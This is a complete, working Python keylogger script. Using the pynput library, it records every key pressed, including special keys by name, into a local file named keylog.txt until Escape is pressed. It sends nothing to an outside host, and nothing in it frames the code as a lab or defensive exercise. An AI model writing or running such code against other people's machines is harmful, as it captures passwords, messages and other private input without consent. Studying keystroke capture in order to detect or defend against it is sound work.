from pynput import keyboard

log_file = "keylog.txt"

def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(key.char)  # Write normal characters
    except AttributeError:
        with open(log_file, "a") as f:
            if key == keyboard.Key.space:
                f.write(" ")  # Log space as space character
            else:
                f.write(f" [{key.name}] ")  # Log special keys by name

def on_release(key):
    # Stop listener if escape key is pressed
    if key == keyboard.Key.esc:
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
